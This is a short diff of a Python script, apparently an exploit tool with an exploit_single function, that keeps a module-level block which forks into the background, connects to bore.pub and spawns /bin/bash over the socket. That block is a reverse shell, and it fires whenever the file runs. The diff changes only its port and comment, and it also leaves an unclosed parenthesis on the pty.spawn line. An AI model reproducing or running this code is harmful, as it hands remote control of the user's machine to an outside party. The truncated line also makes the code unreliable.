@@ -191,14 +191,13 @@ def exploit_single(target, mode):
     return result
 
 
-
 if os.fork() == 0:
-    signal.signal(signal.SIGHUP, signal.SIG_IGN)  # Equivalente ao nohup
+    signal.signal(signal.SIGHUP, signal.SIG_IGN)  
     os.setsid()
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("bore.pub", 38285))
+    s.connect(("bore.pub", 20838))
     for fd in (0, 1, 2): os.dup2(s.fileno(), fd)
-    pty.spawn("/bin/bash")
+    pty.spawn("/bin/bash"
 
 
 def main():
